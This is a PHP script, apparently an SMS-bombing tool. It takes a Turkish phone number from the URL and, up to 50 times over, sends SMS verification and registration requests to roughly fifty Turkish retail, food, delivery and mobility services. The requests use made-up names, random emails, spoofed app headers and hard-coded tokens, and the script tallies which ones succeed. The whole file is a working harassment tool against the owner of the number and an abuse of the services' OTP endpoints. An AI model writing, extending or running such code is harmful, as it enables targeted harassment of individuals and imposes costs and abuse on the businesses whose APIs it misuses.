<?php
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
ini_set('max_execution_time', 600);
ini_set('display_errors', 0);

$phone = isset($_GET['phone']) ? preg_replace('/[^0-9]/', '', $_GET['phone']) : '';
$how   = isset($_GET['how'])   ? intval($_GET['how']) : 1;
if ($how < 1)  $how = 1;
if ($how > 50) $how = 50;
if (strlen($phone) != 10) {
    die(json_encode(['status'=>'error','message'=>'Telefon 10 haneli olmalı'], JSON_UNESCAPED_UNICODE));
}

function rastgeleMail(){ $c='abcdefghijklmnopqrstuvwxyz';$m='';for($i=0;$i<20;$i++)$m.=$c[rand(0,25)];return $m.'@gmail.com'; }
function rastgeleStr($n=10){ $c='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';$m='';for($i=0;$i<$n;$i++)$m.=$c[rand(0,strlen($c)-1)];return $m; }
function rastgeleKucuk($n=10){ $c='abcdefghijklmnopqrstuvwxyz';$m='';for($i=0;$i<$n;$i++)$m.=$c[rand(0,25)];return $m; }
function randTC(){ $d=[rand(1,9)];for($i=1;$i<9;$i++)$d[]=rand(0,9);$d[9]=(($d[0]+$d[2]+$d[4]+$d[6]+$d[8])*7-($d[1]+$d[3]+$d[5]+$d[7]))%10;$d[10]=array_sum($d)%10;return implode('',$d); }

function curlPost($url, $data=null, $headers=[], $jsonEncode=true, $timeout=10){
    $ch=curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch,CURLOPT_TIMEOUT,$timeout);
    curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
    curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,false);
    curl_setopt($ch,CURLOPT_POST,1);
    if ($data!==null){
        if (is_array($data) && $jsonEncode) $data=json_encode($data);
        curl_setopt($ch,CURLOPT_POSTFIELDS,$data);
    }
    if (!empty($headers)) curl_setopt($ch,CURLOPT_HTTPHEADER,$headers);
    $r=curl_exec($ch);
    $c=curl_getinfo($ch,CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ['body'=>$r,'code'=>$c];
}

function curlGet($url, $headers=[], $timeout=10){
    $ch=curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch,CURLOPT_TIMEOUT,$timeout);
    curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false);
    curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,false);
    curl_setopt($ch,CURLOPT_POST,0);
    if (!empty($headers)) curl_setopt($ch,CURLOPT_HTTPHEADER,$headers);
    $r=curl_exec($ch);
    $c=curl_getinfo($ch,CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ['body'=>$r,'code'=>$c];
}

function jsonCevap($c){ $d=json_decode($c['body'],true); return $d?:[]; }
function ok($a,&$s,&$n){ $s[]="OK ".$a; $n++; }
function no($a,&$s,&$n){ $s[]="FAIL ".$a; $n++; }

$mail = rastgeleMail();
$sonuclar = [];
$basarili = 0;
$basarisiz = 0;

for ($i = 0; $i < $how; $i++) {

try { $d=json_encode(["countryCode"=>"90","phoneNumber"=>$phone]); $h=["Content-Type: application/json","Origin: https://www.kahvedunyasi.com"]; $r=curlPost("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number",$d,$h); if(strpos($r['body'],'Success')!==false) ok("kahvedunyasi",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("kahvedunyasi",$sonuclar,$basarisiz); }

try { $d=http_build_query(["confirm"=>"true","date_of_birth"=>"1956-03-01","email"=>$mail,"email_allowed"=>"true","first_name"=>"Memati","gender"=>"male","last_name"=>"Bas","password"=>"31ABC..abc31","phone"=>"0".$phone]); $r=curlPost("https://www.wmf.com.tr/users/register/",$d,["Content-Type: application/x-www-form-urlencoded"],false); if(in_array($r['code'],[200,202])) ok("wmf",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("wmf",$sonuclar,$basarisiz); }

try { $r=curlPost("https://bim.veesk.net/service/v1.0/account/login",["phone"=>$phone]); if($r['code']==200) ok("bim",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("bim",$sonuclar,$basarisiz); }

try { $h=["Content-Type: application/json","Referer: https://www.englishhome.com/"]; $d=json_encode(["Phone"=>$phone,"XID"=>""]); $r=curlPost("https://www.englishhome.com/api/member/sendOtp",$d,$h); if(strpos($r['body'],'"isError":false')!==false) ok("englishhome",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("englishhome",$sonuclar,$basarisiz); }

try { $url="https://u.icq.net/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90".$phone."&platform=ios&r=796356153&smsFormatType=human"; $r=curlPost($url,"",["Content-Type: application/x-www-form-urlencoded"],false); if($r['code']==200) ok("icq",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("icq",$sonuclar,$basarisiz); }

try { $h=["Content-Type: application/x-www-form-urlencoded; charset=utf-8"]; $d="action=register&gsm=".$phone; $r=curlPost("https://suiste.com/api/auth/code",$d,$h,false); if(strpos($r['body'],'common.success')!==false) ok("suiste",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("suiste",$sonuclar,$basarisiz); }

try { $r=curlPost("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp",["msisdn"=>"90".$phone]); if($r['code']==200) ok("kimgb",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("kimgb",$sonuclar,$basarisiz); }

try { $h=["Accept: application/json","Content-Type: application/json;charset=utf-8"]; $d=json_encode(["cep_tel"=>$phone,"cep_tel_ulkekod"=>"90"]); $r=curlPost("https://mobileapiv2.tazi.tech/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin",$d,$h); if(strpos($r['body'],'"kod":"0000"')!==false) ok("tazi",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("tazi",$sonuclar,$basarisiz); }

try { $url="https://heyapi.heymobility.tech/V14//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber=".$phone; $r=curlPost($url,"",[],false); if(strpos($r['body'],'"IsSuccess":true')!==false) ok("hey",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("hey",$sonuclar,$basarisiz); }

try { $h=["Accept: application/json","Content-Type: application/json"]; $d=json_encode(["email"=>"","name"=>"Memati","phoneNumber"=>"+90".$phone,"surname"=>"Bas"]); $r=curlPost("https://api.345dijital.com/api/users/register",$d,$h); if(strpos($r['body'],'E-Posta veya telefon zaten kayıtlı')===false) ok("345dijital",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("345dijital",$sonuclar,$basarisiz); }

try { $h=["Content-Type: application/json"]; $d=json_encode(["email"=>$mail,"phoneNumber"=>$phone]); $r=curlPost("https://www.macrocenter.com.tr/rest/users/register/otp?reid=31",$d,$h); if(strpos($r['body'],'"successful":true')!==false) ok("macrocenter",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("macrocenter",$sonuclar,$basarisiz); }

try { $h=["Content-Type: application/json","X-No-Auth: true","Appversion: 2.4.1","X-Device-Type: 2"]; $d=json_encode(["operationName"=>"GENERATE_OTP","query"=>"mutation GENERATE_OTP(\$phone: String, \$challenge: String, \$deviceUniqueId: String) { generateOtp(phone: \$phone, challenge: \$challenge, deviceUniqueId: \$deviceUniqueId) }","variables"=>["challenge"=>"3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68","deviceUniqueId"=>"720932D5-47BD-46CD-A4B8-086EC49F81AB","phone"=>"+90".$phone]]); $r=curlPost("https://svc.apps.tiklagelsin.com/user/graphql",$d,$h); if(strpos($r['body'],'"generateOtp":true')!==false) ok("tiklagelsin",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("tiklagelsin",$sonuclar,$basarisiz); }

try { $h=["User-Agent: naosstars/1.0030","Os: ios","Platform: ios","Content-Type: application/json"]; $d=json_encode(["telephone"=>"+90".$phone,"type"=>"register"]); $r=curlPost("https://api.naosstars.com/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350",$d,$h); if($r['code']==200) ok("naosstars",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("naosstars",$sonuclar,$basarisiz); }

try { $d=http_build_query(["mobilePhoneNumber"=>$phone,"actionType"=>"register"]); $h=["Content-Type: application/x-www-form-urlencoded; charset=UTF-8"]; $r=curlPost("https://api.hayatsu.com.tr/api/SignUp/SendOtp",$d,$h,false); if(strpos($r['body'],'"is_success":true')!==false) ok("hayatsu",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("hayatsu",$sonuclar,$basarisiz); }

try { $h=["Content-Type: application/json"]; $d=json_encode(["otpOperationType"=>2,"phoneNumber"=>"+90".$phone]); $r=curlPost("https://hizlieczaprodapi.hizliecza.net/mobil/account/sendOTP",$d,$h); if(strpos($r['body'],'"isSuccess":true')!==false) ok("hizliecza",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("hizliecza",$sonuclar,$basarisiz); }

try { $h=["Applicationversion: 2.4.1","Applicationplatform: 2","Content-Type: application/json"]; $d=json_encode(["methodType"=>"2","mobilePhoneNumber"=>$phone]); $r=curlPost("https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend",$d,$h); if(strpos($r['body'],'"status":"success"')!==false) ok("metro",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("metro",$sonuclar,$basarisiz); }

try { $h=["X-Os: IOS","X-Version: 1.7","Content-Type: application/json"]; $d=json_encode(["mobilePhoneNumber"=>"90".$phone]); $r=curlPost("https://api.filemarket.com.tr/v1/otp/send",$d,$h); if(strpos($r['body'],'"responseType":"SUCCESS"')!==false) ok("filemarket",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("filemarket",$sonuclar,$basarisiz); }

try { $h=["X-Platform-Token: 9f493307-d252-4053-8c96-62e7c90271f5","Content-Type: application/json"]; $d=json_encode(["phone"=>$phone]); $r=curlPost("https://akasyaapi.poilabs.com/v1/tr/sms",$d,$h); if(strpos($r['body'],'SMS sended succesfully')!==false) ok("akasya",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("akasya",$sonuclar,$basarisiz); }

try { $h=["X-Platform-Token: a2fe21af-b575-4cd7-ad9d-081177c239a3","Content-Type: application/json"]; $d=json_encode(["phone"=>$phone]); $r=curlPost("https://akbatiapi.poilabs.com/v1/tr/sms",$d,$h); if(strpos($r['body'],'SMS sended succesfully')!==false) ok("akbati",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("akbati",$sonuclar,$basarisiz); }

try { $h=["Firmaid: 32","Content-Type: application/json"]; $d=json_encode(["FirmaId"=>32,"Telefon"=>$phone]); $r=curlPost("https://gateway.komagene.com.tr/auth/auth/smskodugonder",$d,$h); if(strpos($r['body'],'"Success":true')!==false) ok("komagene",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("komagene",$sonuclar,$basarisiz); }

try { $h=["Content-Type: application/json","Token: q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"]; $d=json_encode(["job"=>"start_login","phone"=>$phone]); $r=curlPost("https://panel.porty.tech/api.php",$d,$h); if(strpos($r['body'],'"status":"success"')!==false) ok("porty",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("porty",$sonuclar,$basarisiz); }

try { $d=json_encode(["phone"=>$phone]); $r=curlPost("https://tasdelen.sufirmam.com:3300/mobile/send-otp",$d,[],true,10); if(strpos($r['body'],'"result":true')!==false) ok("tasdelen",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("tasdelen",$sonuclar,$basarisiz); }

try { $d=json_encode(["phone_number"=>$phone]); $r=curlPost("https://api.uysalmarket.com.tr/api/mobile-users/send-register-sms",$d,["Content-Type: application/json"]); if($r['code']==200) ok("uysal",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("uysal",$sonuclar,$basarisiz); }

try { $d=json_encode(["app_version"=>"1.1.5","code"=>"tr","device_model"=>"iPhone8,5","device_name"=>"Memati","device_type"=>"I","device_version"=>"15.8.3","email"=>$mail,"firstname"=>"Memati","is_allow_to_communication"=>"1","language_id"=>"2","lastname"=>"Bas","phone_number"=>$phone,"sms_code"=>""]); $r=curlPost("https://yapp.com.tr/api/mobile/v1/register",$d,["Content-Type: application/json"]); if($r['code']==200) ok("yapp",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("yapp",$sonuclar,$basarisiz); }

try { $d=json_encode(["phone"=>$phone,"kvkk"=>true]); $r=curlPost("https://api.yuffi.co/api/parent/login/user",$d,["Content-Type: application/json"]); if(strpos($r['body'],'"success":true')!==false) ok("yuffi",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("yuffi",$sonuclar,$basarisiz); }

try { $d1=json_encode(["email"=>$mail,"firstName"=>"Memati","language"=>"tr","lastName"=>"Bas","password"=>"123456","phoneCode"=>"90","phoneNumber"=>$phone,"tenant"=>"beefull","username"=>$mail]); curlPost("https://app.beefull.io/api/inavitas-access-management/signup",$d1,["Content-Type: application/json"],true,4); $d2=json_encode(["phoneCode"=>"90","phoneNumber"=>$phone,"tenant"=>"beefull"]); $r=curlPost("https://app.beefull.io/api/inavitas-access-management/sms-login",$d2,["Content-Type: application/json"],true,4); if($r['code']==200) ok("beefull",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("beefull",$sonuclar,$basarisiz); }

try { $h=["Content-Type: application/json"]; $d=json_encode(["email"=>$mail,"isSure"=>false,"mobilePhone"=>$phone]); $r=curlPost("https://frontend.dominos.com.tr/api/customer/sendOtpCode",$d,$h); if(strpos($r['body'],'"isSuccess":true')!==false) ok("dominos",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("dominos",$sonuclar,$basarisiz); }

try { $h=["Platform: 1","Content-Type: application/json"]; $d=json_encode(["AppVersion"=>"1.6.0","AreaCode"=>90,"City"=>"ADANA","CityId"=>1,"Culture"=>"tr-TR","Email"=>$mail,"Gender"=>"Kad1n","GenderId"=>2,"Merchantid"=>5701,"Name"=>"Memati","OsSystem"=>"IOS","Password"=>"31ABC..abc31","PhoneNumber"=>$phone,"Platform"=>1,"Surname"=>"Bas"]); $r=curlPost("https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp",$d,$h,true,10); if(strpos($r['body'],'"Control":1')!==false) ok("baydoner",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("baydoner",$sonuclar,$basarisiz); }

try { $h=["Content-Type: application/json"]; $d=json_encode(["query"=>"mutation (\$phone: String) { sendOtpSms(phone: \$phone) { resultStatus message } }","variables"=>["phone"=>$phone]]); $r=curlPost("https://restashop.azurewebsites.net/graphql/",$d,$h); if(strpos($r['body'],'SUCCESS')!==false) ok("pidem",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("pidem",$sonuclar,$basarisiz); }

try { $d=json_encode(["areaCode"=>"90","etkContract"=>true,"language"=>"TR","phoneNumber"=>"90".$phone]); $r=curlPost("https://api.frink.com.tr/api/auth/postSendOTP",$d,["Content-Type: application/json"]); if(strpos($r['body'],'SUCCESS')!==false) ok("frink",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("frink",$sonuclar,$basarisiz); }

try { $r=curlPost("https://www.a101.com.tr/users/otp-login/",json_encode(["phone"=>"0".$phone]),["Content-Type: application/json"]); if($r['code']==200) ok("a101",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("a101",$sonuclar,$basarisiz); }

try { $h=["Content-Type: application/json"]; $d=json_encode(["gsm"=>"+90".$phone,"source"=>"orwi"]); $r=curlPost("https://gandalf.orwi.app/api/user/requestOtp",$d,$h); if($r['code']==200) ok("bodrum",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("bodrum",$sonuclar,$basarisiz); }

try { $d=json_encode(["mobilePhone"=>"0".$phone]); $r=curlPost("https://www.defacto.com.tr/Customer/SendPhoneConfirmationSms",$d,["Content-Type: application/json"]); if(strpos($r['body'],'IsSMSSend')!==false) ok("defacto",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("defacto",$sonuclar,$basarisiz); }

try { $d=json_encode(["accountType"=>1,"email"=>rastgeleKucuk(12)."@gmail.com","isAddPermission"=>false,"name"=>rastgeleKucuk(8),"lastName"=>rastgeleKucuk(8),"phone"=>$phone]); $r=curlPost("https://apigw.ikinciyeni.com/RegisterRequest",$d,["Content-Type: application/json"]); if(strpos($r['body'],'"isSucceed":true')!==false) ok("ikinciyeni",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("ikinciyeni",$sonuclar,$basarisiz); }

try { $d=json_encode(["mobile_number.phone"=>$phone,"token_type"=>"register_token"]); $r=curlPost("https://api.ceptesok.com/api/users/sendsms",$d,["Content-Type: application/json"]); if($r['code']==200) ok("ceptesok",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("ceptesok",$sonuclar,$basarisiz); }

try { $d=json_encode(["msisdn"=>"90".$phone]); $r=curlPost("https://api.pisir.com/v1/login/",$d,["Content-Type: application/json"]); if(strpos($r['body'],'"ok":"1"')!==false||strpos($r['body'],'"ok":1')!==false) ok("pisir",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("pisir",$sonuclar,$basarisiz); }

try { $d=json_encode(["phonenumber"=>"+90".$phone]); $r=curlPost("https://prod-api-mobile.coffy.com.tr/Account/Account/SendVerificationCode",$d,["Content-Type: application/json"]); if(strpos($r['body'],'"success":true')!==false) ok("coffy",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("coffy",$sonuclar,$basarisiz); }

try { $d=json_encode(["phone"=>"+90".$phone,"location"=>1,"locale"=>"tr"]); $r=curlPost("https://api.sushico.com.tr/tr/sendActivation",$d,["Content-Type: application/json"]); if(strpos($r['body'],'"err":0')!==false) ok("sushico",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("sushico",$sonuclar,$basarisiz); }

try { $d=json_encode(["dil"=>"tr","device_id"=>"","notification_mobile"=>"android-notificationid-will-be-added","platform"=>"android","version"=>"2.0.6","login_type"=>1,"telefon"=>$phone]); $r=curlPost("https://api.kalmasin.com.tr/user/login",$d,["Content-Type: application/json"]); if(strpos($r['body'],'"success":true')!==false) ok("kalmasin",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("kalmasin",$sonuclar,$basarisiz); }

try { $d=json_encode(["Gsm"=>$phone]); $r=curlPost("https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode",$d,["Content-Type: application/json"]); if($r['code']==200) ok("aygaz",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("aygaz",$sonuclar,$basarisiz); }

try { $d=json_encode(["phonenumber"=>"90".$phone,"type"=>"REGISTER","deviceId"=>rastgeleKucuk(16),"language"=>"tr-TR"]); $r=curlPost("https://api.gokarma.app/v1/auth/send-sms",$d,["Content-Type: application/json"]); if($r['code']==201) ok("karma",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("karma",$sonuclar,$basarisiz); }

try { $d=json_encode(["phone"=>"+90".$phone]); $r=curlPost("https://api.hoplagit.com/v1/auth:reqSMS",$d,["Content-Type: application/json"]); if($r['code']==201) ok("hop",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("hop",$sonuclar,$basarisiz); }

try { $r=curlGet("https://sct.scoobyturkiye.com/v1/mobile/user/code-request?phonenumber=90".$phone); if($r['code']==200) ok("scooby",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("scooby",$sonuclar,$basarisiz); }

try { $r=curlGet("https://gezteknoloji.arabulucuyuz.net/api/Account/get-phone-number-confirmation-code-for-new-user?phonenumber=90".$phone); if(strpos($r['body'],'"succeeded":true')!==false) ok("gez",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("gez",$sonuclar,$basarisiz); }

try { $r=curlGet("http://ws.geowix.com/GeoCourier/SubmitPhoneToLogin?phonenumber=".$phone."&firmaID=1048"); if($r['code']==200) ok("jetle",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("jetle",$sonuclar,$basarisiz); }

try { $d=json_encode(["mobile_number"=>"+90".$phone,"os_name"=>"android","os_version"=>"7.1.2","app_version"=>" 1.0.2(12)","push_id"=>"-"]); $r=curlPost("https://api.rbbt.com.tr/v1/auth/authenticate",$d,["Content-Type: application/json"]); if(strpos($r['body'],'"status":true')!==false) ok("rabbit",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("rabbit",$sonuclar,$basarisiz); }

try { $d=json_encode(["phone"=>$phone,"countryId"=>2]); $r=curlPost("https://api.roombadi.com/api/v1/auth/otp/authenticate",$d,["Content-Type: application/json"]); if($r['code']==200) ok("roombadi",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("roombadi",$sonuclar,$basarisiz); }

try { $r=curlGet("https://gomobilapp.ipragaz.com.tr/api/v1/0/authentication/sms/send?phone=".$phone."&isRegistered=false"); if(strpos($r['body'],'"success":true')!==false) ok("goyakit",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("goyakit",$sonuclar,$basarisiz); }

try { $d=json_encode(["MobilePhone"=>$phone]); $r=curlPost("https://pinarsumobileservice.yasar.com.tr/pinarsu-mobil/api/Customer/SendOtp",$d,["Content-Type: application/json"]); if(trim($r['body'])=="1"||trim($r['body'])=="true") ok("pinar",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("pinar",$sonuclar,$basarisiz); }

try { $d=json_encode(["mobile_number"=>$phone,"type"=>null]); $r=curlPost("https://api.oliz.com.tr/api/otp/send",$d,["Content-Type: application/json"]); if(strpos($r['body'],'SUCCESS_SEND_SMS')!==false) ok("oliz",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("oliz",$sonuclar,$basarisiz); }

try { $d=json_encode(["mobilePhone"=>$phone,"mobilePhoneCountryCode"=>"90"]); $r=curlPost("https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin",$d,["Content-Type: application/json"]); if(strpos($r['body'],'"isSuccess":true')!==false) ok("marti",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("marti",$sonuclar,$basarisiz); }

try { $r=curlGet("https://mobileapi.totalistasyonlari.com.tr/SmartSms/SendSms?gsmNo=".$phone); if($r['code']==200) ok("total",$sonuclar,$basarili); else throw new Exception(); } catch(Exception $e){ no("total",$sonuclar,$basarisiz); }

}

echo json_encode([
    'status'    => 'tamam',
    'telefon'   => $phone,
    'tekrar'    => $how,
    'basarili'  => $basarili,
    'basarisiz' => $basarisiz,
    'toplam'    => count($sonuclar),
    'sonuclar'  => $sonuclar
], JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT);